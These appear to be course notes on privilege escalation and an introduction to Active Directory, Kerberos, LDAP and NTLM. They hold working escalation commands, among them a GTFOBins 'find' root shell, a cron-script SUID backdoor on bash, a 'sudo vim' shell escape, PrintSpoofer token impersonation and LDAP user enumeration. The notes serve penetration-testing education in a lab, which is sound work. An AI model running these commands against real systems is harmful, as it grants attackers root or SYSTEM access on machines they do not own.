# Day 09 — Privilege Escalation & Active Directory Intro

**Date:** Aug 06, 2026
**Week:** Week 2 — Penetration Testing & Offensive Security

---

## 🎯 Overview

Two halves: escalating from a low-privilege foothold to higher privileges on Linux and
Windows, then a first look at Active Directory as a whole new attack surface — the hinge
between "compromise one box" and "compromise a domain" (**Day 10**).

## 🐧 Linux Privilege Escalation

**SUID/SGID binaries** (recall the permission bit from **Day 1**) — a SUID binary owned
by root runs with root's privileges no matter who calls it. If that binary can be
manipulated to run arbitrary commands, it's an escalation path.

```bash
find / -perm -4000 -type f 2>/dev/null    # find all SUID binaries system-wide
```
Cross-reference any unusual result against **GTFOBins** (gtfobins.github.io) — a curated
list of standard Unix binaries and how to abuse them for priv-esc if they carry the SUID
bit or excess sudo rights. Example: if `find` itself has SUID set:
```bash
find . -exec /bin/sh -p \; -quit    # spawns a root shell via GTFOBins' find entry
```

**Writable cron jobs** — if a root-run cron script is writable by your user, editing it
gets code execution as root on its next scheduled run:
```bash
cat /etc/crontab                     # look for root-owned jobs
ls -la /path/to/script.sh            # is it writable by you?
echo "chmod u+s /bin/bash" >> /path/to/script.sh   # wait for cron to run it
```

**`sudo -l` misconfigurations** — check what you're allowed to run as another user without
a password, and whether that binary can be abused (again, check GTFOBins):
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'    # vim can spawn a shell -> instant root
```

## 🪟 Windows Privilege Escalation — Token Impersonation

Windows access tokens represent a user's security context. If a service account holds the
`SeImpersonatePrivilege`, "Potato-family" attacks (RottenPotato, JuicyPotato,
PrintSpoofer) coerce a SYSTEM-level connection and capture/impersonate that token.

```powershell
whoami /priv
# SeImpersonatePrivilege   Enabled   <- vulnerable to Potato-style attacks
PrintSpoofer.exe -i -c cmd
```

## 🏢 Active Directory Architecture

```
Forest
 └── Domain (corp.local)
      ├── Organizational Unit (OU) — e.g. "Finance", "IT"
      │     ├── User objects
      │     ├── Computer objects
      │     └── Group objects
      └── Domain Controller (DC) — holds the AD database, authenticates everyone
```
- A **forest** can contain multiple domains sharing a trust relationship.
- **Group Policy Objects (GPOs)** applied at the OU level push settings/software to every
  object beneath them.
- Almost every enterprise Windows network is AD-joined — this is the single most common
  target in real-world internal pentests.

## 🎫 Kerberos Authentication Flow

```
1. Client → KDC:  AS-REQ (request a Ticket Granting Ticket, encrypted with user's password hash)
2. KDC → Client:  AS-REP (issues the TGT if the password hash checks out)
3. Client → KDC:  TGS-REQ (present TGT, request a service ticket for a specific service)
4. KDC → Client:  TGS-REP (issues a Service Ticket, encrypted with the SERVICE account's hash)
5. Client → Service: present the Service Ticket to authenticate directly
```
The key insight for later attacks: the **AS-REP** is encrypted with the *user's* hash, and
the **Service Ticket** is encrypted with the *service account's* hash — if you can grab
either encrypted blob, you can attempt to crack it **offline**, with no further contact
with the DC. This is exactly what AS-REP Roasting and Kerberoasting (**Day 10**) do.

## 🔍 LDAP

LDAP (Lightweight Directory Access Protocol) is how AD is *queried* — every user,
computer, and group is an LDAP object with attributes.

```bash
ldapsearch -x -h dc01.corp.local -b "dc=corp,dc=local" "(objectClass=user)"
```
Anonymous/low-privilege LDAP binds often reveal the entire user list, group memberships,
and sometimes even password-policy details — pure recon gold for planning **Day 10**'s
attacks.

## 🆚 NTLM vs Kerberos

| | NTLM | Kerberos |
|---|------|----------|
| Type | Challenge-response | Ticket-based |
| Relies on | Password hash directly | Encrypted tickets, mutual auth |
| Weaknesses | Pass-the-hash, relay attacks, weaker crypto (MD4) | Kerberoasting, AS-REP roasting, golden/silver tickets |
| When used | Legacy fallback, workgroup auth | Default for AD-joined machines |

NTLM being weaker but still supported for backward compatibility is why it's targeted so
often in real engagements.

## 🔗 How This Connects

- SUID bits abused here are the exact permission bits introduced conceptually on **Day 1**.
- Kerberos/LDAP fundamentals here are required before Kerberoasting makes sense on
  **Day 10**.
- This day is the hinge between "compromise one box" (Week 2 so far) and "compromise a
  domain" (**Day 10**).

## 📎 Resources

- https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- https://www.thehacker.recipes/

## ✅ Checkpoint / Deliverable

- [ ] Documented Linux priv-esc path (user → root) on the lab VM, including which technique worked and why
- [ ] LDAP enumeration output showing at least the domain's user and group list
